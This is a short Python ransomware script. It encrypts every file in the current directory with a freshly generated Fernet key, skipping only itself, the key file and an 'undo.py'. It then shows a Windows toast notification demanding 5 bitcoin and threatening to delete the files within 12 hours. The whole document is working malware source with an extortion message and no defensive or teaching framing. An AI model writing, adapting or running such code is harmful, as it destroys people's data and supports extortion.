import os
from win10toast import ToastNotifier
import time
from cryptography.fernet import Fernet
toaster = ToastNotifier()
files = []
mynotification = ToastNotifier()

for file in os.listdir():
    if file == "ransom.py":
        continue
    if file == "thekey.key":
        continue
    if file == "undo.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

deleted = file


for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)

toaster.show_toast("Alert", "I encrypted all your files!! send me 5 bitcoin. then close this tab. I will send you a password. open the undo application and enter that password. that will decrypt your files. if you don't send me my bitcoin in 12 hours, I will delete all your files!\n", duration=20)

